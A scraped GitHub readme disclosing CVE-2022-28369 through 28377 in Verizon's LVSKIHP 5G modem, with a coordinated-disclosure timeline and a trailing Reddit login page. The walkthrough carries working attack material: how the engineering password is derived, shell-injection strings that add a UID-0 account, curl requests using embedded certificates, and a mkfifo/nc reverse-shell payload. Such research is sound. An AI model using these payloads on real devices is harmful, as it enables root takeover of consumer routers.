=== Content from github.com_996218d1_20250108_123049.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJousterL%2FSecWriteups%2Fblob%2Fmain%2FVerizon%2520LVSKIHP%25205G%2520Modem%2Freadme.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJousterL%2FSecWriteups%2Fblob%2Fmain%2FVerizon%2520LVSKIHP%25205G%2520Modem%2Freadme.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=JousterL%2FSecWriteups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JousterL](/JousterL)
/
**[SecWriteups](/JousterL/SecWriteups)**
Public

* [Notifications](/login?return_to=%2FJousterL%2FSecWriteups) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FJousterL%2FSecWriteups)
* [Star
   3](/login?return_to=%2FJousterL%2FSecWriteups)

* [Code](/JousterL/SecWriteups)
* [Issues
  0](/JousterL/SecWriteups/issues)
* [Pull requests
  0](/JousterL/SecWriteups/pulls)
* [Actions](/JousterL/SecWriteups/actions)
* [Projects
  0](/JousterL/SecWriteups/projects)
* [Security](/JousterL/SecWriteups/security)
* [Insights](/JousterL/SecWriteups/pulse)

Additional navigation options

* [Code](/JousterL/SecWriteups)
* [Issues](/JousterL/SecWriteups/issues)
* [Pull requests](/JousterL/SecWriteups/pulls)
* [Actions](/JousterL/SecWriteups/actions)
* [Projects](/JousterL/SecWriteups/projects)
* [Security](/JousterL/SecWriteups/security)
* [Insights](/JousterL/SecWriteups/pulse)

## Files

 main
## Breadcrumbs

1. [SecWriteups](/JousterL/SecWriteups/tree/main)
2. /[Verizon LVSKIHP 5G Modem](/JousterL/SecWriteups/tree/main/Verizon%20LVSKIHP%205G%20Modem)
/
# readme.md

 Blame  Blame
## Latest commit

## History

[History](/JousterL/SecWriteups/commits/main/Verizon%20LVSKIHP%205G%20Modem/readme.md)133 lines (109 loc) · 14 KB main
## Breadcrumbs

1. [SecWriteups](/JousterL/SecWriteups/tree/main)
2. /[Verizon LVSKIHP 5G Modem](/JousterL/SecWriteups/tree/main/Verizon%20LVSKIHP%205G%20Modem)
/
# readme.md

Top
## File metadata and controls

* Preview
* Code
* Blame

133 lines (109 loc) · 14 KB[Raw](https://github.com/JousterL/SecWriteups/raw/refs/heads/main/Verizon%20LVSKIHP%205G%20Modem/readme.md)
# Introduction

The Verizon 5G LVSKIHP is an all-in-one integrated Modem and Router that provides access to the Verizon Wireless 5G Wireless for Home Internet service. The consumer side of the device provides basic settings for configuration of the Wi-Fi, Firewall, Parental Controls, etc. This device can also be put into Bridge Mode, hat tip to Tifan.net's research:

<https://tifan.net/blog/2021/04/01/enable-bridge-mode-on-verizon-5g-home-router-lv55-lvskisp/>

# Credit

* Matthew Lichtenberger
* Shea Polansky

# CVEs

* [CVE-2022-28369](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28369.txt?raw=true) - IDU 3.4.66.162 does not validate URI passed to enable\_ssh function, allowing arbitrary file upload/execution.
* [CVE-2022-28370](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28370.txt?raw=true) - ODU 3.33.101.0 does not validate firmware cryptographically when uploaded to the crtc\_fw\_upgrade function.
* [CVE-2022-28371](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28371.txt?raw=true) - IDU 3.4.66.162 & ODU 3.33.101.0 utilize static firmware-embedded certificate for authentication to JSON listeners.
* [CVE-2022-28372](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28372.txt?raw=true) - IDU 3.4.66.162 & ODU 3.33.101.0 do not validate the URI passed to JSON listener for firmware update.
* [CVE-2022-28373](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28373.txt?raw=true) - IDU 3.4.66.162 does not properly sanitize user-controlled parameters within the crtcreadpartition function. Shell metacharacters can be injected to achieve remote code execution as the root user.
* [CVE-2022-28374](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28374.txt?raw=true) - ODU 3.33.101.0 does not properly sanitize user-controlled parameters within the DMACC URLs on the Engineering page. Shell metacharacters can be injected to achieve remote code execution as the root user.
* [CVE-2022-28375](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28375.txt?raw=true) - ODU 3.33.101.0 does not properly sanitize user-controlled parameters within the crtcswitchsimprofile function. Shell metacharacters can be injected to achieve remote code execution as the root user.
* [CVE-2022-28376](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28376.txt?raw=true) - IDU 3.4.66.162 & ODU 3.33.101.0 pre-generate a static password for the "verizon" engineering account.
* [CVE-2022-28377](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/CVE-2022-28377.txt?raw=true) - IDU 3.4.66.162 & ODU 3.33.101.0 pre-generate a static password for the "jrpc" account.

# Walkthrough

## Rooting the OutDoor Unit (ODU)

When the device is in Bridge Mode, the Consumer side ceases to provide any functionality (although the backend links can still be accessed). [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/1.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/1.png) It also exposes an interface at 10.0.0.1 that requires a username and password to access. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/2.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/2.png)

The consumer side allows one to export the logs of the device, by navigating to the System Settings, [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/3.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/3.png) clicking the arrow for History Log, and clicking "Export Log". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/4.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/4.png) When this function is triggered, it creates a .tar.gz of the entire Log directory and provides it to the user (under subdirectory /mnt/wnc/logs). [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/5.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/5.png) Several of the logs are instructive towards identifying further targets for investigation. The most useful log for this purpose was OMADM.log, which logged the device receiving a firmware update. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/6.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/6.png)

Downloading and binwalking this file shows that it is an unencrypted Squashfs Filesystem. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/7.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/7.png) Mounting it, there are several files of interest, but the main focus was on the "sdxprairie-sysfs.ubi" file. Since it's a UBI file system, Linux will not mount it as a loop device, [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/8.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/8.png) as UBI filesystems are block-based NAND, so they need to be extracted or mounted to a fake NAND: [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/9.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/9.png)[![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/10.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/10.png)

```
sudo modprobe nandsim first_id_byte=0x2c second_id_byte=0xac third_id_byte=0x90 fourth_id_byte=0x26
sudo nandwrite /dev/mtd0 sdxprairie-sysfs.ubi
sudo modprobe ubi mtd=/dev/mtd0,4096
sudo mount -t ubifs -o ro /dev/ubi0_0 test

```

The filesystem resembles a basic Linux ARM environment; however, several folders are empty, and it is likely they have mount points on the device and don't exist in the firmware image. However, exploring /etc/initscripts finds several interesting shell scripts for operating the device. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/11.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/11.png) One of particular note is the function within /etc/initscripts/wnc\_keygen titled "create\_engineer\_pwd". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/12.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/12.png)

This function reveals that the engineering username is "verizon" and the engineering password is the first and last 7 characters of the SHA256 hash of the Serial Number concatenated with the Model Number of the device. It is possible to log in on the interface at 10.0.0.1 with this information. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/13.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/13.png)

As Verizon likely did not expect casual users to access this portal, it seemed likely that less effort went into security hardening this side of the web portal. Initial efforts focused on the "Enable Telnet" functionality provided on the Settings page, but the above function provides the "verizon" user with a shell of "/bin/false", so this effort was halted. However, further down on the Settings page there are several arbitrary text fields, including ones labelled "DMACC1" through "DMACC3". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/14.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/14.png)

Exploring further into the firmware image, the LuCI webserver controller was located at /usr/lib/lua/5.1/luci/. Digging into the /view/vz\_page/setting.htm file, the following line governs the text input. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/15.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/15.png)

Grepping for dmacc3 within the luci folder, there is a reference to controller/admin/settings.lua. Opening that file up, this function appears to utilize text placed in that field with no sanitization. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/16.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/16.png)

Thus, this field was injectable. When a line like '; reboot;# is placed at the end of a DMACC URL string, the device reboots. Several attempts were made, like attempting to utilize sed to change the /bin/false in /etc/passwd, invoking a reverse shell, and others, before a successful approach was identified. Since the device runs all binaries as root, it is possible to edit any file on the system. By appending a new user account to the /etc/passwd and /etc/shadow files, a user "tester" with the password "testtest" is created in the system: [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/17.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/17.png) [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/18.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/18.png)

```
'; echo 'tester:$6$npapnF1GfqtUSVWY$vA1CApnnjXxQiIXMl2JKhpnS0V.g0cTNx2HDGvxeURrhTMjjQsO2DN6ec6hLjAG2Ao2yZiPgE4GdbbgvuCBf9/:::::::' >> /etc/shadow; #
'; echo "tester:x:0:0:tester:/bin/ash" >> /etc/passwd; #

```

Once this is complete, and the "Telnet Enable" toggle is selected, no further barriers were encountered logging in with Telnet. As the tester account was configured with the UID of 0 and the GID of 0, no privilege escalation is required. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/19.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/19.png)

This completes the rooting of the "ODU" component of the device, or "OutDoor Unit" aspect. Note that the /etc/shadow and /etc/passwd are not regenerated on reboot, so this is a persistent modification (until a new firmware is loaded into the device).

## Rooting the InDoor Unit (IDU)

The other half of the device is the "IDU" or "InDoor Unit", which runs the consumer-side functionality of the router, at 10.0.0.2. Verizon appears to have spent time hardening this side... attempting to inject on many of the fields returns a warning saying "Due to security concerns, please do not use special characters, e.g. ()[];|'<>`&="". Additionally, a JSON response of "invalid symbol" is returned, which suggests the check is performed server side. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/20.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/20.png)

While watching the network traffic when navigating pages, several "encr\_get" queries were observed. These queries are encrypted with a public key the server provides, and are encrypted by a function in "wnc.js" that is as follows:

```
params.args = JSON.stringify(params.args);
if(cmd.api == CMD.ENCR_GET.api || cmd.api == CMD.ENCR_SET.api){
     //console.log(params.args);  // need remove
     const encrypt = new JSEncrypt();
     encrypt.setPublicKey(sessionStorage.pubkey);
     var encrypt_data = ""
     var end = 0;
     for(var i=0; end < (params.args.length+1); i++){
           end = ((i+1)*117) > (params.args.length+1) ? (params.args.length+1): ((i+1)*117)
           var str = params.args.slice(i*117, end);
           encrypt_data = encrypt_data + encrypt.encrypt(str) + "#";
     }
     params.args = encodeURIComponent(encrypt_data);
}

```

Putting a breakpoint before the params.args is encrypted, [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/21.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/21.png) the request is for [{"ObjName":"Device.Users.User."}] and that the response contains 4 JSON Objects, each titled "cpe-User-". 1 is "root", 2 is "jrpc", 3 is the consumer user "admin", and 4 is "verizon". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/22.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/22.png) Going back to the login screen, there is a hidden field named "srp\_username" that holds the value of "admin". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/23.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/23.png) Removing the type="hidden" property on that field and using the engineering password from above allows for login as the Verizon user, [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/24.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/24.png) but no further functionality was immediatley exposed when logged in. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/25.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/25.png) Note that you can also breakpoint line 140 of cgi-bin/luci in the debugger, and in the console issue "username = encrypt.encrypt("verizon")" to perform the same mod. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/26.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/26.png)[![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/27.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/27.png)

However, once the account was logged out again, it redirects to a new endpoint: /cgi-bin/luci/verizon/engineer. This time, the page title is "Engineer Sign In", [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/28.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/28.png) and using the same engineer password redirects to a new environment with new functionality. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/29.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/29.png) A toggle allows the user to disable the Software Update (useful to 'hold' the device at a vulnerable version), run a speed test, edit the Wifi settings, and more. Additionally, none of these fields trigger the warning seen earlier. Like the engineer portal on the ODU, consumers are not expected to access this section, and thus fields trust any input provided.

As above, the next step was to explore the IDU's file system. Initially it seemed like any attack on the IDU was going to be blind, but a second review of the OMADM.log file during the update process revealed the following line. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/30.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/30.png)

The WNC\_SIGNED\_LVSKIHP.32bit.nand.lab2.3.4.66.162.210520\_1031.bin file exists in the update firmware. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/31.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/31.png) However, a different approach was required to extract this file system. The previous trick to mount the UBI against a nandsim wasn't working, [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/32.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/32.png)[![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/33.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/33.png) so instead the "ubi\_reader" tool from <https://github.com/jrspruitt/ubi_reader> was used. First, we extract the UBI image with:

```
dd if=WNC_SIGNED_LVSKIHP.32bit.nand.lab2.3.4.66.162.210520_1031.bin of=idu.ubi bs=1 skip=3328688

```

Then using the command "ubireader\_extract\_images idu.ubi" extracted three files into the directory "ubifs-root/idu.ubi", one of which was named "img-1221542750\_vol-ubi\_rootfs.ubifs". blkid identifies this as a squashfs image. Using:

```
sudo unsquashfs ubifs-root/idu.ubi/img-1221542750_vol-ubi_rootfs.ubifs

```

The root filesystem for the IDU side is revealed. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/34.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/34.png) Hunting through the file system, we find a configuration file for the lighttpd daemon, and it identifies an interface listening on port 48443, named "crtc". [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/35.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/35.png) Amazingly, it accepts a set of keys that are hardcoded into the firmware, in the same directory. Reviewing the /usr/lib/lua/luci/crtc.lua file, a function named "crtcreadpartition" was identified as not santizing its parameters. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/36.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/36.png)

In order to get access to this function, we must first enable the crtcmode of the modem. To do so, we issue the following curl command:

```
curl -m 10 -s -k https://10.0.0.2:48443/cgi-bin/luci/rpc/crtc --cacert ca.pem --cert server.pem -X POST -d '{"jsonrpc":"2.0","id":1,"method":"crtcmode","params":["enable"]}'

```

This command also benefits us in that it automatically enables telnet and USB on the ODU side. [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/37.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/37.png) An injection payload was crafted of the format:

```
curl -m 10 -s -k https://10.0.0.2:48443/cgi-bin/luci/rpc/crtc --cacert ca.pem --cert server.pem -X POST -d '{"jsonrpc":"2.0","id":1,"method":"crtcreadpartition","params":["; <payload>;#"]}'.

```

After a few different approaches were attempted, the mkfifo method of creating a reverse shell was identified as a successful approach. As the ODU had already been rooted, it seemed a good target for connecting back to, as it is trusted by the IDU and thus it was unlikely that firewall rules would interfere. The final payload was: [![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/38.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/38.png)

```
curl -m 10 -s -k https://10.0.0.2:48443/cgi-bin/luci/rpc/crtc --cacert ca.pem --cert server.pem -X POST -d '{"jsonrpc":"2.0","id":1,"method":"crtcreadpartition","params":["; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 11223 >/tmp/f ;#"]}'

```

And the command run on the ODU was:

```
nc -l -p 11223

```

Note that whoami does not exist on this system, but it is running as the root user. Persistence can be established through any of a myriad of ways. We suggest a reverse shell in the crontab file.

# Improvements

Improvements can be seen in the codebases for both the InDoorUnit (IDU):
[![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/IDUImprovements.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/IDUImprovements.png)
And in the OutDoorUnit (ODU):
[![](/JousterL/SecWriteups/raw/main/Verizon%20LVSKIHP%205G%20Modem/images/ODUImprovements.png)](/JousterL/SecWriteups/blob/main/Verizon%20LVSKIHP%205G%20Modem/images/ODUImprovements.png)

# Timeline

* 2021-12-25 : Vulnerabilities discovered.
* 2021-12-29 : Verizon contacted.
* 2022-01-12 : No response from Verizon, report sent to manufacturer: Wistron NeWeb Corp.
* 2022-01-13 : Verizon acknowledged report.
* 2022-01-27 : Update requested.
* 2022-02-03 : Update requested. Verizon responds, no substantive update.
* 2022-02-15 : Modem receives firmware update 5.33.117.1. Still vulnerable to attack chain.
* 2022-02-23 : Verizon requested screenshots of exploits in action. Provided same day.
* 2022-02-26 : Notified Verizon that the Engineering password was now in the wild on a Reddit post. Verizon acknowledged 2/28/22.
* 2022-03-25 : Requested update, and informed that vulnerabilities were submitted to MITRE for CVE issuance.
* 2022-04-27 : Modem receives firmware downgrade back to 3.33.101.1. Requested update from Verizon.
* 2022-05-02 : Received CVEs for vulnerabilities. Provided to Verizon, as well as indication that report would be released July 1st. Verizon indicated end of May for remediation.
* 2022-06-01 : Update requested.
* 2022-06-14 : Modem receives firmware update 5.33.141.1. All vulnerabilities are patched.
* 2022-06-28 : Verizon provided confirmation from security team that all vulnerabilities have been resolved.
* 2022-07-01 : Public release.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.reddit.com_3c5f4c6d_20250108_123049.html ===

[Skip to main content](#main-content)

Reddit and its partners use cookies and similar technologies to provide you with a better experience.

By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising.

By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform.

For more information, please see our
[Cookie Notice](https://reddit.com/en-us/policies/cookies)
and our
[Privacy Policy](https://reddit.com/en-us/policies/privacy-policy).

Open menu

Open navigation
Go to Reddit Home

r/verizon

A chip

A close button

Get App

Get the Reddit app

[Log In](https://www.reddit.com/login/)Log in to Reddit

Expand user menu
Open settings menu

* [Log In / Sign Up](https://www.reddit.com/login/)
* [Advertise on Reddit](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=user_menu_cta)
* [Shop Collectible Avatars](/avatar/shop)

close

# Don’t miss a thing from Reddit!

I agree to get emails about cool stuff on Reddit

Continue

close

# Log In

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

Continue with phone number

---

OR

---

Email or username

Password

Forgot password?

New to Reddit?
Sign Up

Log In

back

# Enter the 6-digit code from your authenticator app

You’ve set up two-factor authentication for this account.

Verification code

Lost access to your authenticator?
Use a backup code

Check code

back

# Enter a 6-digit backup code

You’ve set up two-factor authentication for this account.

Backup code

Don’t have access to your backup code?
Use a code from an authenticator app

Check code

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Continue with phone number

---

OR

---

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

back

# Reset your password

Enter your email address or username and we’ll send you a link to reset your password

Email or username

[Need help?](https://reddithelp.com/hc/sections/360008917491-Account-Security)

Reset password

close

back

# Check your inbox

An email with a link to reset your password was sent to the email address associated with your account

Didn't get an email?

Resend

close

# Choose a Reddit account to continue

back

close

# Reset your password

New password

Confirm new password

Resetting your password will log you out on all devices.

Continue


